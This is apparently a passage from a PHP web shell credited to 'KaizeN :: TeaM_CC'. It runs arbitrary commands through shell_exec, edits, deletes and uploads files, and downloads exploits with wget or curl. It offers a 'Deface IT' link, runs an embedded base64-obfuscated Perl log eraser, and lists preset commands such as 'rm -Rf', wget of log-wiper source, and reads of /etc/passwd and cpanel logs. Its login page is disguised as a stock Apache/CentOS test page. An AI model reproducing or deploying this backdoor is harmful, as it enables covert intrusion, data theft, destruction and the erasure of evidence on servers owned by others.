	<input type="hidden" name="myfilename" value="<?php echo $_GET['file']; ?>">
        <table align="center" border="1" style="width:40%;">
            <tr>
                <td style="height:40px" align="right">Change Permissions </td><td align="center"><input value="0755" name="chmode" class="sbox" /></td> 
            </tr>
			<tr>
				<td colspan="2" align="center" style="height:60px">
        <input type="Submit" value="Change Permission" class="but" style="padding: 5px;" name="changeperms"/></td>
			</tr>
        </table>
		
	</form>   
    <?php
}

else if(isset($_GET['rename']))
{
?>
    <form method="GET" action="<?php echo $self; ?>" >
	<input type="hidden" name="getdir" value="<?php echo $_GET['getdir']; ?>">
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" name="file" class="box" /></td>
            </tr>
            <tr>
                <td>To </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" name="to" class="box" /></td> 
            </tr>
        </table>
		<br>
        <input type="Submit" value="Rename It" class="but" style="margin-left: 160px;padding: 5px;"/>
</form>   
    <?php
  
}
 else if(isset($_GET['open']))
{
    ?>
        <form method="POST" action="<?php echo $self;?>"\>
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['open'];?>" class="box" name="file" /></td>
            </tr>
            <tr>
                <td>Size </td><td> : </td><td><input value="<?php echo filesize($_GET['open']);?>" class="box" /></td> 
            </tr>
        </table>
        <textarea name="content" rows="20" cols="100" class="box"><?php
        $content = htmlspecialchars(file_get_contents($_GET['open']));
        if($content)
        {
            echo $content;
        }
        else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
        {
            fopen($_GET['open']);
            while(!feof())
            {
                echo htmlspecialchars(fgets($_GET['open']));
            }
        }

        ?>
        </textarea><br />
        <input name="save" type="Submit" value="Save Changes" id="spacing" class="but"/>
        </form>
    <?php
}

else if(isset($_POST['file']) &&
        isset($_POST['content']) )
{
    if(is_dir($_POST['file']))
    {
        header("location:".$self."?dir=".$_POST['file']);
    }
    if(file_exists($_POST['file']))
    {
        $handle = fopen($_POST['file'],"w");
        fwrite($handle,$_POST['content']);
        header("Location:$self");
    }
    else
    {
        echo "<p class='alert'>File Name Specified does not exists!</p>";
    }
}

else if(isset($_GET['selfkill']))
{
	unlink(__FILE__);
	echo "<br><center><font class=txt size=5>Good Bye......</font></center>";
}

else if(isset($_POST['executecmd']))
{
	if($_POST['mycmd']=="logeraser")
	{
		$erase = gzinflate(base64_decode("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"));
		if(is_writable("."))
		{	
			if($openp = fopen(getcwd()."/logseraser.pl", 'w'))
			{
				fwrite($openp, $erase);
				fclose($openp);
				passthru("perl logseraser.pl linux");
				unlink("logseraser.pl");
				echo "<center><font color=#FFFFFF size=3>Logs Cleared</font></center>";
			}
		} else 
		{
			if($openp = fopen("/tmp/logseraser.pl", 'w'))
			{
				fwrite($openp, $erase)or die("Error");
				fclose($openp);
				$aidx = passthru("perl logseraser.pl linux");
				unlink("logseraser.pl");
				echo "<center><font color=#FFFFFF size=3>Logs Cleared</font></center>";
			}
		}
	}
	else
	{
		$check = shell_exec($_POST['mycmd']);
		echo "<center><textarea cols=120 rows=20 class=box>" . $check . "</textarea></center>";
	}
}

else if(isset($_POST['changefileperms']))
{
	if($_POST['chmode'] != null && is_numeric($_POST['chmode']))
	{
		$actbox = $_POST["actbox3"];
		foreach ($actbox as $v) 
		{
			$perms = 0; 
            for($i=strlen($_POST['chmode'])-1;$i>=0;--$i) 
                $perms += (int)$_POST['chmode'][$i]*pow(8, (strlen($_POST['chmode'])-$i-1)); 
			echo "<center><div align=left style=width:60%;>";
			if(@chmod($v,$perms))
				echo "<blink><font size=3>File $v Permissions Changed Successfully</font></blink>";
			else
				echo "<blink><font size=3 class=txt>Cannot Change $v File Permissions</font></blink>";
			echo "</div></center>";
		}
			
	}
}
else if(isset($_POST['choice']))
{  
	if($_POST['choice'] == "chmod")
	{ ?>
		<form method="POST" ><?php 
		$actbox1 = $_POST['actbox'];
		foreach ($actbox1 as $v) 
		{ ?>
			<input type="hidden" name="actbox3[]" value="<?php echo $v; ?>">
		<?php }
		?>
			<table align="center" border="1" style="width:40%;">
				<tr>
					<td style="height:40px" align="right">Change Permissions </td><td align="center"><input value="0755" name="chmode" class="sbox" /></td> 
				</tr>
				<tr>
					<td colspan="2" align="center" style="height:60px">
			<input type="Submit" value="Change Permission" class="but" style="padding: 5px;" name="changefileperms"/></td>
				</tr>
			</table>
			
		</form>  <?php
	}
	else if($_POST['choice'] == "delete") 
	{
		$actbox = $_POST["actbox"];

		foreach ($actbox as $v) 
		{
			if(is_file($v))
			{
				if(unlink($v))
				{
					echo "<br><center><font class=txt size=3>File $v Deleted Successfully</font></center>";
				}
				else
					echo "<br><center><font size=3>Cannot Delete File $v</font></center>";
			}	
			else if(is_dir($v))
			{
				rrmdir($v);
				$loc = $_SERVER['REQUEST_URI'];
				header("Location:$loc");
				ob_end_flush();
			}
		}
	}
	else if($_POST['choice'] == "compre") 
	{
		$actbox = $_POST["actbox"];
		foreach ($actbox as $v) 
		{
			if(is_file($v))
			{
				$zip = new ZipArchive();
				$filename= basename($v) . '.zip';
				if(($zip->open($filename, ZipArchive::CREATE))!==true)
				{ echo '<br><font size=3>Error: Unable to create zip file for $v</font>';}
				else {echo "<br><font class=txt size=3>File $v Compressed successfully</font>";}
				$zip->addFile(basename($v));
				$zip->close();
			}
			else if(is_dir($v))
			{
				if($os == "Linux")
				{
					$filename= basename($v);
					execmd("tar --create --recursion --file=$filename.tar $v");
					echo "<br><font class=txt size=3>File $v Compressed successfully as $v.tar</font>";
				}
			}
		}
	}
	else if($_POST['choice'] == "uncompre") 
	{
		$actbox = $_POST["actbox"];
		foreach ($actbox as $v) 
		{
			 $zip = new ZipArchive;
			 $filename= basename($v);
			 $res = $zip->open($filename);
			 if ($res === TRUE) 
			 {
			 	 $pieces = explode(".",$filename);
				 $zip->extractTo($pieces[0]);
				 $zip->close();
				 echo "<br><font class=txt size=3>File $v Unzipped successfully</font>";
			 } else {
				 echo "<br><font size=3>Error: Unable to Unzip file $v</font>";
			 }
		}
	}
}

else if(isset($_POST['execute']))
	{
		$comm = $_POST['execute'];


		chdir($_POST['executepath']);
		$check = shell_exec($comm);
		
			echo "<center><textarea cols=120 rows=20 class=box>" . $check . "</textarea></center>";
		
			?>
			<BR><BR><center><form action="<?php $self; ?>" method="post">
			<input type="hidden" name="executepath" value="<?php echo $_POST['executepath']; ?>" />
			<input type="text" class="box" name="execute">
			<input type="submit" value="Execute" class="but"></form></center>
			<?php
	}
	
	else if(isset($_POST['Create']))
	{
	?>
	<form method="post">
	
	<input type="hidden" name="filecreator" value="<?php echo $_POST['createfile']; ?>">
		<textarea name="filecontent" rows="20" cols="100" class="box"></textarea><br />
        <input name="createmyfile" type="Submit" value="  Save " id="spacing" class="but"/>
  </form>
		
	<?php }

else
{ 
	
	$mydir = basename(dirname(__FILE__));
	$pdir = str_replace($mydir,"",$dir);
	$pdir = str_replace("/","",$dir);
	
	$files = array();
	$dirs  = array();
	
	 $odir=opendir($dir);
	 while($file = readdir($odir))
	 {
	   if(is_dir($dir.'/'.$file))
	   {
		 $dirs[]=$file;
	   }
	   else
	   {
		 $files[]=$file;
	   }
	 }
	 $countfiles = count($dirs) + count($files);
	 $dircount = count($dirs); 
	 $dircount = $dircount-2;
?>
	<table style="width:95%;" align="center" cellpadding="0">
	<tr class="file"><td colspan="7" align="center"><font class="txt">Listing folder <?php echo $dir; ?></font> (<?php echo $dircount.' Dirs And '.count($files).' Files'; ?>)</td>
    <tr class="file">
        <th style="width:53%;">Name</th>
        <th style="width:7%;">Size</th>
        <th style="width:9%;">Permissions</th>
	<?php if($os != "Windows"){ echo "<th style=\"width:9%;\">Owner / Group</th>"; } ?>
		<th style="width:12%;">Modification Date</th>
        <th style="width:6%;">Rename</th>
		<th style="width:7%;">Download</th>
		<th style="width:3%;">Action</th>
    </tr>
	
<?php

   if(isset($_GET['download']))
	{
		download();			
	}
	?>
	<form method="post" id="myform" name="myform">
	<?php 
	$dir = getcwd();
    if(isset($_GET['dir']))
    {
        $dir = $_GET['dir'];
    }
	$i = 0;
	if(is_dir($dir))
    {
		if($countfiles == 2)
			echo "<tr><td colspan=5><center><font size=3>No files or directory present or Cannot view files and directory</font></center></td></tr>";
			
		foreach($dirs as $val)
		{
			?>
			<font color="#999999">
			<?php if($val == ".")
			{
				?><tr class="file"><td class='info'><a href='<?php echo $self; ?>'>[ . ]</a></td><td>CURDIR</td>
			<td><?php if(is_writable(getcwd())) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo getcwd(); ?>"><font class="wrtperm"><?php echo getFilePermissions(getcwd());?></font></a><?php } else if(is_readable(getcwd())) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo getcwd(); ?>"><font class="readperm"><?php echo getFilePermissions(getcwd());?></font></a><?php } else { ?><a href="<?php echo $self; ?>?perms&file=<?php echo getcwd(); ?>"><font class="noperm"><?php echo getFilePermissions(getcwd());?></font><?php } ?></td>
			<?php if($os != 'Windows')
				  { 
				    echo "<td>";
				  	$name=@posix_getpwuid(@fileowner($self)); 
					$group=@posix_getgrgid(@filegroup($self)); 
					$owner = $name['name']. " / ". $group['name']; 
					echo $owner . "</td>";
				} 
					 ?>
			<td><font size="2" class="txt"><?php echo date('Y-m-d H:i:s', @filemtime(getcwd())); ?></font></td>
			<td></td><td></td><td></td></</tr><?php 
			
			}else if($val=="..") { $val = Trail($dir . $directorysperator . $val,$directorysperator); ?>
			<tr  class="file"><td class='info'><a href='<?php echo $self . "?dir=".$val; ?>'>[ .. ]</a></td><td>UPDIR</td>
			
			<td><?php if(is_writable($val)) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $val; ?>"><font class="wrtperm"><?php echo getFilePermissions($val);?></font></a><?php } else if(is_readable($val)) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $val; ?>"><font  class="readperm"><?php echo getFilePermissions($val);?></font></a><?php } else { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $val; ?>"><font  class="noperm"><?php echo getFilePermissions($val);?></font><?php } ?></td>
			<?php 	if($os != 'Windows')
					{
					echo "<td>"; 
					$name=@posix_getpwuid(@fileowner($val)); 
					$group=@posix_getgrgid(@filegroup($val)); 
					$owner = $name['name']. " / ". $group['name']; 
					echo $owner . "</td>";
					}  ?>
			<td><font size="2" class="txt"><?php echo date('Y-m-d H:i:s', @filemtime($val)); ?></font></td>
			<td></td><td></td><td></td></tr><?php continue; }
		}
        foreach($dirs as $val)
		{
			$i++;
			?>
			<font color="#999999">
   	        
    	    <?php if($val == "." || $val == "..") continue; ?>
			<tr  class="file">
			<td class='dir'><a href='<?php echo $self ?>?dir=<?php echo $dir . $directorysperator . $val; ?>'>[ <?php echo $val; ?> ]</a></td>
        	<td class='info'>DIR</td>
            <td class='info'><?php if(is_writable($dir . $directorysperator . $val)) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $dir . $directorysperator . $val; ?>"><font class="wrtperm"><?php echo getFilePermissions($dir . $directorysperator . $val);?></font></a><?php } else if(is_readable($dir . $directorysperator . $val)) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $dir . $directorysperator . $val; ?>"><font  class="readperm"><?php echo getFilePermissions($dir . $directorysperator . $val);?></font></a><?php } else { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $dir . $directorysperator . $val; ?>"><font class="noperm"><?php echo getFilePermissions($dir . $directorysperator . $val);?></font><?php } ?></td>
			<?php if($os != 'Windows')
					{
					echo "<td>"; 
					$name=@posix_getpwuid(@fileowner($val)); 
					$group=@posix_getgrgid(@filegroup($val)); 
					$owner = $name['name']. " / ". $group['name']; 
					echo $owner . "</td>";
					}  ?>			
			<td><font size="2" class="txt"><?php echo date('Y-m-d H:i:s', @filemtime($dir . $directorysperator . $val)); ?></font></td>
			<td class="info"><a href="<?php echo $self;?>?getdir=<?php echo $dir; ?>&rename=<?php echo $dir . $directorysperator . $val;?>">Rename</a></td>
			<td></td>
			<td class="info" align="center"><input type="checkbox" name="actbox[]" id="actbox<?php echo $i; ?>" value="<?php echo $dir . $directorysperator . $val;?>"></td>
            </tr></font>
            <?php
		}
		foreach($files as $val)
		{
			 $i++;
             ?>
                   <tr class="file">
                   <td class='file'><a href='<?php echo $self ?>?open=<?php echo $dir . $directorysperator . $val; ?>'><?php if(("/" .$val == $_SERVER["SCRIPT_NAME"]) || ($val == "index.php") || ($val == "index.html") || ($val == "config.php") || ($val == "wp-config.php")) { echo "<font color=#F4FA58>". $val . "</font>";  } else { echo $val; } ?></a> <?php if($val == "index.php" || $val == "index.html") { if(strlen($ind) != 0) { echo "<a href='?deface=" . $dir . $directorysperator . $val . "'><font color=#F4FA58>( Deface IT )</font></a>"; } } ?></td>
				   <td class='info'><?php echo HumanReadableFilesize(filesize($dir . $directorysperator . $val));?></td>
				   
                   <td class='info'><?php if(is_writable($dir . $directorysperator . $val)) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $dir . $directorysperator . $val; ?>"><font class="wrtperm"><?php echo getFilePermissions($dir . $directorysperator . $val);?></font></a><?php } else if(is_readable($dir . $directorysperator . $val)) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $dir . $directorysperator . $val; ?>"><font  class="readperm"><?php echo getFilePermissions($dir . $directorysperator . $val);?></font></a><?php } else { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $dir . $directorysperator . $val; ?>"><font class="noperm"><?php echo getFilePermissions($dir . $directorysperator . $val);?></font><?php } ?></td>
			<?php if($os != 'Windows')
					{
					echo "<td>"; 
					$name=@posix_getpwuid(@fileowner($val)); 
					$group=@posix_getgrgid(@filegroup($val)); 
					$owner = $name['name']. " / ". $group['name']; 
					echo $owner . "</td>";
					}  ?>				   
			<td><font size="2" class="txt"><?php echo date('Y-m-d H:i:s', @filemtime($dir . $directorysperator . $val)); ?></font></td>
                   <td class="info"><a href="<?php echo $self;?>?getdir=<?php echo $dir; ?>&rename=<?php echo $dir . $directorysperator . $val;?>">Rename</a></td>
				   <td class="info"><a href="<?php echo $self;?>?download=<?php echo $dir . $directorysperator .$val;?>">Download</a>
				   <td class="info" align="center"><input type="checkbox" name="actbox[]" id="actbox<?php echo $i; ?>" value="<?php echo $dir . $directorysperator . $val;?>"></td>
                   </tr>
                   <p>
 			 <?php
        }
	}
	else
    {
        echo "<p><font size=4>".$_GET['dir']." is <b>NOT</b> a Valid Directory!<br /></font></p>";
    }

echo "</table>
<div align='right' style='width:97%;'><BR><input type='checkbox' name='checkall' onclick='checkedAll();'> <font class=txt>Check All </font> &nbsp;
<select class=sbox name=choice style='width: 100px;'>
			<option value=delete>Delete</option>
			<option value=chmod>Change mode</option>
			if(class_exists('ZipArchive'))
			{	<option value=compre>Compress</option>
			<option value=uncompre>Uncompress</option> }
		</select>
	
	<input type=submit value=Submit name=checkoption class=but></form></div>";
}

?>
</p>
<table style="width:100%;" border="1">
<tr>
<td align="center">
<form method="post" enctype="multipart/form-data">
 		
		Upload file : <br><input class="upld" type="file" name="uploadfile" class="box" size="50"><input type="hidden" name="path" value="<?php echo $dir; ?>" />&nbsp;<input type=submit value="Upload" name="u" value="u" class="but" ></form>
		 <?php
		
if (is_writable($dir)) {
    echo '<font class=wrtperm>&lt; writable &gt;</font>';
} else {
    echo '&lt; not writable &gt;';
}
		?>
		  <br>
		


</td>
<td align="center" style="height:105px;">Create File : 
<form method="post">
<input type="text" class="box" value="<?php echo $dir . $directorysperator; ?>" name="createfile"> <input type="submit" value="Create" name="Create" class="but">
</form>
<?php
	
if (is_writable($dir)) {
    echo '<font class=wrtperm>&lt; writable &gt;</font>';
} else {
    echo '&lt; not writable &gt;';
}
		?>
</td>
</tr>
<tr>
<td align="center" style="height:105px;">Execute : <form action="<?php echo $self; ?>" method="post">
<input type="hidden" name="executepath" value="<?php echo $dir; ?>" />
<input type="text" class="box" name="execute"> <input type="submit" value="Execute" class="but"></form></td>

<td align="center">Create Directory : <form method="post">
<input type="text" value="<?php echo $dir . $directorysperator; ?>" class="box" name="createfolder"> 
<input type="submit" value="Create" name="createdir" class="but">
</form><?php
		
if (is_writable($dir)) {
    echo '<font class=wrtperm>&lt; writable &gt;</font>';
} else {
    echo '&lt; not writable &gt;';
}
?></td></tr>
<tr><td style="height:105px;" align="center">Get Exploit&nbsp;<form method="post" actions="<?php echo $self; ?>">
<input type="text" name="wurl" class="box" value="http://www.some-code/exploits.c"> <input type="submit" name="uploadurl" value="  G0  " class="but"><br><br>
<input type="hidden" name="path" value="<?php echo $dir; ?>">
<select name="functiontype" class="sbox"> 
<option value="wwget">wget</option> 
<option value="wlynx">lynx</option> 
<option value="wfread">fread</option> 
<option value="wfetch">fetch</option> 
<option value="wlinks">links</option> 
<option value="wget">GET</option> 
<option value="wcurl">curl</option> 
</select>
</form>
</td>
<td align="center">
<form method="post" action="<?php echo $self; ?>">
Some Commands<br>
<?php if($os != "Windows")
{ ?>
<SELECT NAME="mycmd" class="box">
     <OPTION VALUE="uname -a">Kernel version
     <OPTION VALUE="w">Logged in users
     <OPTION VALUE="lastlog">Last to connect
	 <option value='cat /etc/hosts'>IP Addresses
	 <option value='cat /proc/sys/vm/mmap_min_addr'>Check MMAP
	 <OPTION VALUE="logeraser">Log Eraser
	 <OPTION VALUE="find / -perm -2 -ls">Find all writable directories
	 <OPTION VALUE="find . -perm -2 -ls">Find all writable directories in Current Folder
	 <OPTION VALUE="find / -type f -name \"config*\"">find config* files
	 <OPTION VALUE="find . -type f -name \"config*\"">find config* files in current dir
	 <OPTION VALUE="find . -type f -perm -04000 -ls">find suid files in current dir
	 <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins
     <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!
     <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?
	 <?php if(is_dir('/etc/valiases')){ ?><option value="ls -l /etc/valiases">List of Cpanel`s domains(valiases)</option><?php } ?>
	 <?php if(is_dir('/etc/vdomainaliases')) { ?><option value=\"ls -l /etc/vdomainaliases">List Cpanel`s domains(vdomainaliases)</option><?php } ?>
     <OPTION VALUE="which wget curl w3m lynx">Downloaders?
     <OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO
	 <OPTION VALUE="ps aux">Show running proccess
	 <OPTION VALUE="uptime">Uptime check
	 <OPTION VALUE="cat /proc/meminfo">Memory check
     <OPTION VALUE="netstat -an | grep -i listen">Open ports
	 <OPTION VALUE="rm -Rf">Format box (DANGEROUS)
     <OPTION VALUE="wget www.ussrback.com/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed)
     <OPTION VALUE="gcc zap2.c -o zap2">WIPELOGS PT2
     <OPTION VALUE="./zap2">WIPELOGS PT3
	 <OPTION VALUE="cat /var/cpanel/accounting.log">Get cpanel logs
 </SELECT>
 <?php } else {?>
 <SELECT NAME="mycmd" class="box">
   	<OPTION VALUE="dir /s /w /b *config*.php">Find *config*.php in current directory
	<OPTION VALUE="dir /s /w /b index.php">Find index.php in current dir
 	<OPTION VALUE="systeminfo">System Informations
	<OPTION VALUE="net user">User accounts
    <OPTION VALUE="netstat -an">Open ports
	<OPTION VALUE="getmac">Get Mac Address
	<OPTION VALUE="net start">Show running services
	<OPTION VALUE="net view">Show computers
	<OPTION VALUE="arp -a">ARP Table
	<OPTION VALUE="tasklist">Show Process
	<OPTION VALUE="ipconfig/all">IP Configuration
	
 </SELECT>
 <?php } ?>
<input type="submit" value="Execute" class="but" name="executecmd">
</form>
</td>
</tr></table><br>
	
</td>
</tr>
</table>
<?php


//logout

if(isset($_GET['logout']))
{
    setcookie("hacked",time() - 60*60);
	header("Location:$self");
	ob_end_flush();
}	
?>

<hr>
<div align="center">
<span class=headtitle><span class=headtitle><font size="4">KaizeN :: TeaM_CC</font></span><br>
<font  size="4">www.bandungdigitalsecurity.org</font></a></div>
<?php 
}	
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
    if( $_POST['uname'] == $user && $_POST['passwd'] == $pass )
    {
         setcookie("hacked", md5($pass));
		 $selfenter = $_SERVER["PHP_SELF"];
		 header("Location:$selfenter");
	}
}
		
if((!isset($_COOKIE['hacked']) || $_COOKIE['hacked']!=md5($pass)) )
{
		
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
	<head>
		<title>Apache HTTP Server Test Page powered by CentOS</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<style type="text/css">
			body {
				background-color: #fff;
				color: #000;
				font-size: 0.9em;
				font-family: sans-serif,helvetica;
				margin: 0;
				padding: 0;
			}
			:link {
				color: #0000FF;
			}
			:visited {
				color: #0000FF;
			}
			a:hover {
				color: #3399FF;
			}
			h1 {
				text-align: center;
				margin: 0;
				padding: 0.6em 2em 0.4em;
				background-color: #3399FF;
				color: #ffffff;
				font-weight: normal;
				font-size: 1.75em;
				border-bottom: 2px solid #000;
			}
			h1 strong {
				font-weight: bold;
			}
			h2 {
				font-size: 1.1em;
				font-weight: bold;
			}
			.content {
				padding: 1em 5em;
			}
			.content-columns {
				/* Setting relative positioning allows for 
				absolute positioning for sub-classes */
				position: relative;
				padding-top: 1em;
			}
			.content-column-left {
				/* Value for IE/Win; will be overwritten for other browsers */
				width: 47%;
				padding-right: 3%;
				float: left;
				padding-bottom: 2em;
			}
			.content-column-right {
				/* Values for IE/Win; will be overwritten for other browsers */
				width: 47%;
				padding-left: 3%;
				float: left;
				padding-bottom: 2em;
			}
			.content-columns>.content-column-left, .content-columns>.content-column-right {
				/* Non-IE/Win */
			}
			img {
				border: 2px solid #fff;
				padding: 2px;
				margin: 2px;
			}
			a:hover img {
				border: 2px solid #3399FF;
			}
		</style>
	</head>

	<body>
	<h1>Apache 2 Test Page<br><font size="-1"><strong>powered by</font> CentOS</strong></h1>

		<div class="content">
			<div class="content-middle">
				<p>This page is used to test the proper operation of the Apache HTTP server after it has been installed. If you can read this page it means that the Apache HTTP server installed at this site is working .</p>
			</div>
<hr />
			<div class="content-columns">
				<div class="content-column-left">
					<h2>If you are a member of the general public:</h2>

					<p>The fact that you are seeing this page indicates that the website you just visited is either experiencing problems or is undergoing routine maintenance.</p>

					<p>If you would like to let the administrators of this website know that you've seen this page instead of the page you expected, you should send them e-mail. In general, mail sent to the name "webmaster" and directed to the website's domain should reach the appropriate person.</p>

					<p>For example, if you experienced problems while visiting www.example.com, you should send e-mail to "webmaster@example.com".</p>
				</div>

				<div class="content-column-right">
					<h2>If you are the website administrator:</h2>

					<p>You may now add content to the directory <tt>/var/www/html/</tt>. Note that until you do so, people visiting your website will see this page and not your content. To prevent this page from ever being used, follow the instructions in the file <tt>/etc/httpd/conf.d/welcome.conf</tt>.</p>

						<p>You are free to use the images below on Apache and CentOS Linux powered HTTP servers.  Thanks for using Apache and CentOS!</p>

						<p><a href="http://httpd.apache.org/"><img src="http://www.parador.es/icons/apache_pb.gif" alt="[ Powered by Apache ]"/></a> <a href="http://www.centos.org/"><img src="http://www.parador.es/icons/poweredby.png" alt="[ Powered by CentOS Linux ]" width="88" height="31" /></a></p>
				</div>
			</div>
                </div><center><form method="POST">
				<input type="text" name="uname" class="sbox"  value="" onFocus="if (this.value == ''){this.value=''; this.style.color='black';}" onBlur="if (this.value == '') {this.value=''; this.style.color='#828282';}" AUTOCOMPLETE="OFF">
				<input type="password" name="passwd" class="sbox"  value="" onFocus="if (this.value == ''){this.value=''; this.style.color='black';}" onBlur="if (this.value == '') {this.value=''; this.style.color='#828282';}" AUTOCOMPLETE="OFF">
				<input type="submit" class="sbox" value=""></center>
                <div class="content">
<div class="content-middle"><h2>About CentOS:</h2><b>The Community ENTerprise Operating System</b> (CentOS) Linux is a community-supported enterprise distribution derived from sources freely provided to the public by Red Hat. As such, CentOS Linux aims to be functionally compatible with Red Hat Enterprise Linux. The CentOS Project is the organization that builds CentOS. We mainly change packages to remove upstream vendor branding and artwork.</p> <p>For information on CentOS please visit the <a href="http://www.centos.org/">CentOS website</a>.</p>
<p><h2>Note:</h2><p>CentOS is an Operating System and it is used to power this website; however, the webserver is owned by the domain owner and not the CentOS Project.  <b>If you have issues with the content of this site, contact the owner of the domain, not the CentOS Project.</b> <p>Unless this server is on the CentOS.org domain, the CentOS Project doesn't have anything to do with the content on this webserver or any e-mails that directed you to this site.</p> <p>For example, if this website is www.example.com, you would find the owner of the example.com domain at the following WHOIS server:</p> <p><a href="http://www.internic.net/whois.html">http://www.internic.net/whois.html</a></p>
                        </div>
		</div>
